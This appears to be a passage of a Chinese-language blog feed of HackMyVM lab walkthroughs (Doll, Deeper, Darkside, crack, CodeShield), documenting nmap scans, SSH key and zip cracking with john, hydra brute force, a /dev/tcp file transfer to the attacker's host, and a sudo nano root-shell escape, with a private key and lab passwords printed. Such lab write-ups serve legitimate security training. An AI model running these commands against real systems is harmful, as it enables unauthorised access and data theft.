+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls -la
+总计 24
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
+drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
+-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
+drwx------ 2 kali kali 4096 2023年 4月25日 root
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cd home 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home]
+└─$ ls -al
+总计 12
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 .
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 bela
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home]
+└─$ cd bela 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ l -al 
+总计 16
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ./
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ../
+-rw------- 1 kali kali   57 2023年 4月25日 .ash_history
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .ssh/
+-rwxr-xr-x 1 kali kali    0 1969年12月31日 .wh..wh..opq*
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cat .ash_history                     
+pwd
+ls -la
+mkdir .ssh
+cd .ssh
+nano id_rsa
+vi id_rsa
+exit
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cat .wh..wh..opq
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cd .ssh       
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ls -al
+总计 12
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ..
+-rw-r--r-- 1 kali kali 2635 2023年 4月25日 id_rsa
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ cat id_rsa    
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+VtVwCw==
+-----END OPENSSH PRIVATE KEY-----
+                                             
+```
+
+省了，都不用爆破shadow了
+
+```
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh2john id_rsa &gt; hash
+                                         
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:01:24 0.05% (ETA: 2025-01-31 17:41) 0g/s 105.4p/s 105.4c/s 105.4C/s passat..kicker
+0g 0:00:01:39 0.06% (ETA: 2025-01-31 17:26) 0g/s 105.9p/s 105.9c/s 105.9C/s strokes..jhoan
+
+```
+
+爆破不出来，不会是用这个吧
+
+![image](assets/image-20250129204242-qkg0s6r.png)
+
+试试
+
+```
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ chmod 600 id_rsa 
+
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh bela@192.168.72.129 -i id_rsa
+ssh: connect to host 192.168.72.129 port 22: No route to host
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh bela@192.168.72.129 -i id_rsa
+Enter passphrase for key 'id_rsa': 
+Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
+bela@doll:~$ id
+uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+
+```
+
+# 3.提权
+
+```
+bela@doll:~$ sudo -l
+Matching Defaults entries for bela on doll:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bela may run the following commands on doll:
+    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337
+
+```
+
+​`fzf`​ 是一个交互式命令行模糊查找工具，并且其 `--listen`​ 选项允许它接收来自远程连接的命令。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Doll.html</guid><pubDate>Thu, 20 Mar 2025 08:04:37 +0000</pubDate></item><item><title>hmv_Deeper</title><link>https://7r1UMPH.github.io/post/hmv_Deeper.html</link><description># hmv_Deeper
+
+# 0.简介
+
+**靶机**：[hackmyvm - Deeper](https://hackmyvm.eu/machines/machine.php?vm=Deeper)
+**难度**：绿色
+**目标 IP**：192.168.205.143
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:34 CST
+Nmap scan report for 192.168.205.143
+Host is up (0.00046s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:49:23:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
+```
+
+# 2.踩点
+
+![Image](https://github.com/user-attachments/assets/91ecf9bd-ad4e-46cc-a738-92bfc7524a8b)
+
+加上
+
+![Image](https://github.com/user-attachments/assets/a2ee96a4-dce7-48ce-b94c-68125e7b3459)
+
+![Image](https://github.com/user-attachments/assets/f7e4d481-8c35-47be-ba4d-88c63577b3c6)
+
+![Image](https://github.com/user-attachments/assets/6ca74cb9-75f8-49fe-8abb-fb13d0bd5c02)
+
+解码（[cyberchef](https://cyberchef.org/)）
+
+![Image](https://github.com/user-attachments/assets/5a25d1be-e84d-4793-948c-0a3678f8ceaa)
+
+![Image](https://github.com/user-attachments/assets/c68825cd-5fbd-459d-aed3-0a45900572b1)
+
+# 3.提权
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ ssh alice@192.168.205.143                                             
+The authenticity of host '192.168.205.143 (192.168.205.143)' can't be established.
+ED25519 key fingerprint is SHA256:LsWOF4O2aDb/w6V7Z5VEAcjNfkxMmPOzyEIC7HMr91o.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.205.143' (ED25519) to the list of known hosts.
+alice@192.168.205.143's password: 
+Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103
+alice@deeper:~$ id
+uid=1000(alice) gid=1000(alice) groups=1000(alice)
+alice@deeper:~$ sudo -l
+[sudo] password for alice: 
+Sorry, user alice may not run sudo on deeper.
+alice@deeper:~$ ls -la
+total 32
+drwxr--r-- 3 alice alice 4096 Aug 26  2023 .
+drwxr-xr-x 4 root  root  4096 Aug 25  2023 ..
+lrwxrwxrwx 1 alice alice    9 Aug 25  2023 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 alice alice  220 Aug 25  2023 .bash_logout
+-rw-r--r-- 1 alice alice 3526 Aug 25  2023 .bashrc
+-rw-r--r-- 1 alice alice   41 Aug 25  2023 .bob.txt
+drwxr-xr-x 3 alice alice 4096 Aug 26  2023 .local
+-rw-r--r-- 1 alice alice  807 Aug 25  2023 .profile
+-rw-r--r-- 1 alice alice   33 Aug 26  2023 user.txt
+alice@deeper:~$ cat .bob.txt
+535746745247566c634556756233566e61413d3d
+
+```
+
+![Image](https://github.com/user-attachments/assets/6cba623b-f063-4b85-93e5-72e751571700)
+
+```bash
+alice@deeper:/home$ su - bob
+Password: 
+bob@deeper:~$ id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@deeper:~$ sudo -l
+[sudo] password for bob: 
+Sorry, user bob may not run sudo on deeper.
+bob@deeper:~$ ls -la
+total 28
+drwxr--r-- 3 bob  bob  4096 Aug 26  2023 .
+drwxr-xr-x 4 root root 4096 Aug 25  2023 ..
+lrwxrwxrwx 1 bob  bob     9 Aug 25  2023 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 bob  bob   220 Apr 23  2023 .bash_logout
+-rw-r--r-- 1 bob  bob  3526 Apr 23  2023 .bashrc
+drwxr-xr-x 3 bob  bob  4096 Aug 25  2023 .local
+-rw-r--r-- 1 bob  bob   807 Aug 25  2023 .profile
+-rw-r--r-- 1 bob  bob   215 Aug 26  2023 root.zip
+bob@deeper:~$ cat root.zip &gt; /dev/tcp/192.168.205.141/7777
+
+#kali
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ nc -lvnp 7777 &gt; root.zip 
+listening on [any] 7777 ...
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 40706
+                                                 
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ zip2john root.zip &gt; hash                          
+ver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0
+                                                                                                                                   
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+No password hashes left to crack (see FAQ)
+                                                                                                                                   
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ john --show hash                                  
+root.zip/root.txt:bob:root.txt:root.zip::root.zip
+
+1 password hash cracked, 0 left                                              
+                                 
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ unzip root.zip
+Archive:  root.zip
+[root.zip] root.txt password: 
+ extracting: root.txt                                                                                                                                               
+                                                                                                                                 
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cat root.txt
+root:IhateMyPassword
+                                
+```
+
+登录root
+
+```bash
+bob@deeper:~$ su -
+Password: 
+root@deeper:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+```。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Deeper.html</guid><pubDate>Thu, 20 Mar 2025 08:03:36 +0000</pubDate></item><item><title>hmv_Darkside</title><link>https://7r1UMPH.github.io/post/hmv_Darkside.html</link><description># hmv_Darkside
+
+# 0.简介
+
+**靶机**：[hackmyvm - Darkside](https://hackmyvm.eu/machines/machine.php?vm=Darkside)
+**难度**：绿色
+**目标 IP**：192.168.205.134
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+一号男嘉宾，`nmap`开扫
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.134
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 10:42 CST
+Nmap scan report for 192.168.205.134
+Host is up (0.00078s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:2D:1C:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.69 seconds                                                 
+```
+
+优先查看**http服务**端口，**ssh端口**如果没有进展再进行爆破
+
+# 2.踩点
+
+![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)
+
+是个登录页，尝试`sql注入、万能密码、弱密码`均无果，使用`Nikto`进行WEB漏洞扫描
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nikto -h 192.168.205.134                       
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.205.134
++ Target Hostname:    192.168.205.134
++ Target Port:        80
++ Start Time:         2025-01-14 10:43:28 (GMT8)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.56 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /backup/: Directory indexing found.
++ /backup/: This might be interesting.
++ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2025-01-14 10:43:50 (GMT8) (22 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+有个备份目录，我们去网页查看一下
+
+![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)
+
+只有一个`vote.txt`文本文件，给了我们几个用户名，我们拿这几个用户名去尝试爆破ssh服务
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.134/backup/vote.txt|awk -F ':' '{print $1}'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   205  100   205    0     0  69751      0 --:--:-- --:--:-- --:--:--  100k
+rijaba
+xerosec
+sml
+cromiphi
+gatogamer
+chema
+talleyrand
+d3b0o
+
+Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ vim user  
+                                      
+┌──(kali㉿kali)-[~/test]
+└─$ cat user
+rijaba
+xerosec
+sml
+cromiphi
+gatogamer
+chema
+talleyrand
+d3b0o
+kevin
+                  
+┌──(kali㉿kali)-[~/test]
+└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.134 -I -u -f -e nsr -t 64 
+
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-14 11:04:45
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 45027 login tries (l:9/p:5003), ~704 tries per task
+[DATA] attacking ssh://192.168.205.134:22/
+
+```
+
+爆破的同时，我们用burp也爆破登录页
+
+![image](https://github.com/user-attachments/assets/b8ec81f2-f037-4bec-a27e-335aee5329d9)
+
+选这个，设置好参数后启动爆破
+
+![image](https://github.com/user-attachments/assets/f4a491ef-5970-4991-b5e2-83ae8de8d3c7)
+
+按照长度排序，可以发现该组用户密码长度明细不一样，尝试登录
+
+![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)
+
+获得了一串类似于base64的字符串，拿去[cyberchef](https://cyberchef.org/)解密
+
+![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)
+
+（尴尬了，是base58）输出了一串和网址很像的字符串，我们访问一下
+
+![image](https://github.com/user-attachments/assets/1b02d153-2df9-4f83-a249-714cf8196a93)
+
+问我们选哪边，我们查看源码
+
+![image](https://github.com/user-attachments/assets/fe152899-e95a-4487-a6a3-69c1bdc75f10)
+
+代码是实现了当存在名为 **side** 的 **cookie** 并且它的值是 `darkside`，那么脚本将重定向用户到 URL `hwvhysntovtanj.password`，我懒得改**cookie**了，我们直接访问
+
+![image](https://github.com/user-attachments/assets/9bc27d36-69e8-4d83-a178-f695a8e598ce)
+
+获得了一个貌似是**ssh服务**密码，我们尝试一下
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ ssh kevin@192.168.205.134  
+The authenticity of host '192.168.205.134 (192.168.205.134)' can't be established.
+ED25519 key fingerprint is SHA256:pmPw9d2/o54jN+Dmo29Hq6rIzWOQ//VhyZvK4KN6rmk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.205.134' (ED25519) to the list of known hosts.
+kevin@192.168.205.134's password: 
+Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
+kevin@darkside:~$ id
+uid=1000(kevin) gid=1000(kevin) groups=1000(kevin)
+```
+
+成功连接
+
+# 3.提权
+
+```bash
+kevin@darkside:~$ sudo -l
+[sudo] password for kevin: 
+Sorry, user kevin may not run sudo on darkside.
+kevin@darkside:~$ 
+kevin@darkside:~$ ls -la
+total 32
+drwxr-xr-x 3 kevin kevin 4096 Oct 30  2023 .
+drwxr-xr-x 4 root  root  4096 Oct 15  2023 ..
+lrwxrwxrwx 1 kevin kevin    9 Oct 30  2023 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout
+-rw-r--r-- 1 kevin kevin 3526 Oct 15  2023 .bashrc
+-rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .history
+drwxr-xr-x 3 kevin kevin 4096 Oct 15  2023 .local
+-rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile
+-rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt
+kevin@darkside:~$ cat .history
+ls -al
+hostname -I
+echo 'Congratulations on the OSCP Xerosec'
+top
+ps -faux
+su rijaba
+ILoveJabita
+ls /home/rijaba
+
+```
+
+在家目录发现了`.history`文本文件，查看获得了`rijaba`的密码，尝试登录
+
+```bash
+kevin@darkside:~$ su rijaba
+Password: 
+rijaba@darkside:/home/kevin$ id
+uid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)
+```
+
+继续测试提权
+
+```bash
+rijaba@darkside:/home/kevin$ sudo -l
+Matching Defaults entries for rijaba on darkside:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User rijaba may run the following commands on darkside:
+    (root) NOPASSWD: /usr/bin/nano
+
+```
+
+可以使用**root**运行`nano`，我们进行提权
+
+```bash
+rijaba@darkside:/home/kevin$ sudo /usr/bin/nano
+```
+
+![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)
+
+进入`nano`按**CTRL+R**，**CTRL+X**，输入`reset; sh 1&gt;&amp;0 2&gt;&amp;0`就提权成功了
+
+![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Darkside.html</guid><pubDate>Thu, 20 Mar 2025 08:02:34 +0000</pubDate></item><item><title>hmv_crack</title><link>https://7r1UMPH.github.io/post/hmv_crack.html</link><description># hmv_crack
+
+# 0.简介
+
+**靶机**：[hackmyvm - crack](https://hackmyvm.eu/machines/machine.php?vm=crack)
+**难度**：绿色
+**目标 IP**：192.168.205.143
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 15:51 CST
+Nmap scan report for 192.168.205.143
+Host is up (0.00043s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+4200/tcp  open  vrml-multi-use
+12359/tcp open  unknown
+MAC Address: 08:00:27:75:33:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds
+
+```
+
+`4000、12359`是什么端口我们不知道，所以我们先看**ftp**端口
+
+# 2.踩点
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ ftp 192.168.205.143                         
+Connected to 192.168.205.143.
+220 (vsFTPd 3.0.3)
+Name (192.168.205.143:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||50526|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
+226 Directory send OK.
+ftp&gt; cd upload
+250 Directory successfully changed.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||30618|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
+226 Directory send OK.
+ftp&gt; mget crack.py
+mget crack.py [anpqy?]? y
+229 Entering Extended Passive Mode (|||35830|)
+150 Opening BINARY mode data connection for crack.py (849 bytes).
+100% |*****************************************************************************************|   849        1.71 MiB/s    00:00 ETA
+226 Transfer complete.
+849 bytes received in 00:00 (799.51 KiB/s)
+ftp&gt; exit
+221 Goodbye.
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ cat crack.py  
+import os
+import socket
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+port = 12359
+s.bind(('', port))
+s.listen(50)
+
+c, addr = s.accept()
+no = 'NO'
+while True:
+        try:
+                c.send('File to read:'.encode())
+                data = c.recv(1024)
+                file = (str(data, 'utf-8').strip())
+                filename = os.path.basename(file)
+                check = '/srv/ftp/upload/'+filename
+                if os.path.isfile(check) and os.path.isfile(file):
+                        f = open(file,'r')
+                        lines = f.readlines()
+                        lines = str(lines)
+                        lines = lines.encode()
+                        c.send(lines)
+                else:
+                        c.send(no.encode())
+        except ConnectionResetError:
+                pass
+
+```
+
+发现了`12359`端口的运行脚本，脚本实现文件读取服务。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_crack.html</guid><pubDate>Thu, 20 Mar 2025 08:01:32 +0000</pubDate></item><item><title>hmv_CodeShield</title><link>https://7r1UMPH.github.io/post/hmv_CodeShield.html</link><description># hmv_CodeShield
+
+# 0.简介
+
+**靶机**：[hackmyvm - CodeShield](https://hackmyvm.eu/machines/machine.php?vm=CodeShield)
+**难度**：绿色
+**目标 IP**：192.168.205.138
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.138
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 10:33 CST
+Nmap scan report for 192.168.205.138
+Host is up (0.046s latency).
+Not shown: 65526 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           vsftpd 3.0.5
+80/tcp    open  http          nginx
+110/tcp   open  pop3          Dovecot pop3d
+143/tcp   open  imap          Dovecot imapd (Ubuntu)
+443/tcp   open  ssl/http      nginx
+993/tcp   open  imaps?
+995/tcp   open  pop3s?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+MAC Address: 08:00:27:61:49:1F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.22 seconds
+```
+
+先把我们感兴趣的端口挑出来`21、80、443、22222`，现在就这几个，后面没有头绪再挑
+
+# 2.踩点
+
